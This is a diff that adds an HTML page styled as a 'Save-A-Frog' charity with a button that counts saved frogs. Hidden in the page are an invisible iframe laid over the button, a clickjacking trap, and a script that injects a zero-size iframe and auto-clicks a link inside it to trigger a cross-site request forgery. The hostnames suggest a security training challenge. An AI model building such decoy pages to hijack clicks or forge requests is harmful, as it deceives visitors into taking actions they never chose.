@@ -1,0 +1,52 @@
+<!DOCTYPE>
+<html>
+    <head>
+        <title>Save-A-Frog</title>
+    </head>
+    <body style="background-color: green;">
+        <h1 style="text-align: center; font-size: 60pt; margin-bottom: -30px;">Frogs in Need</h1>
+        <marquee><h2>Thousands of frogs are in need of saving right now</h2></marquee>
+        <div style="text-align: center;">
+        <img style = "width: 300px; height: 300px; margin: auto;"
+        src="http://www.amnh.org/var/ezflow_site/storage/images/media/amnh/images/frog/311113-1-eng-US/frog_dynamic_lead_slide.jpg">
+        <img style = "width: 300px; height: 300px; margin: auto;"
+        src="http://www.savethefrogs.com/amphibians/images/south-america/Hypsiboas-cinerascens-8a.jpg">
+        <img style = "width: 300px; height: 300px; margin: auto;"
+        src="http://static.boredpanda.com/blog/wp-content/uploads/2016/11/frog-photography-tantoYensen-fb__700-png.jpg">
+        <br />
+        </div>
+        <div style="text-align: center;">
+            <button style="font-size: 40pt;">sav >1< frog</button>
+        </div>
+        <div>
+            <h1 style="text-align: center; color: blue;">
+                Frogs Saved: <span id="saved">0</span>
+            </h1>
+            <iframe src="http://clickjacking-challenges.r7.io/level/2?name=kyleiws" 
+                style="position: absolute; top:385px; left: 370px; opacity: 0;"/>
+        </div>
+
+        
+        <script>
+            var but = document.querySelector("button");
+            but.onclick = function() {
+                var curVal = parseInt(document.getElementById("saved").innerHTML);
+                document.getElementById("saved").innerHTML = curVal + 1;
+            }
+
+            var iframe = document.createElement("iframe");
+            iframe.src = "http://csrf-challenges.r7.io/make_post/4";
+            iframe.style.width = 0;
+            iframe.style.height = 0;
+            document.body.appendChild(iframe);
+            var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+            if(iframeDoc.readyState == 'complete') {
+                iframe.contentWindow.onload = function() {
+                    iframe.contentDocument.querySelectorAll("a")[1].click();
+                    
+                }
+            }
+
+        </script>
+    </body>
+</html>
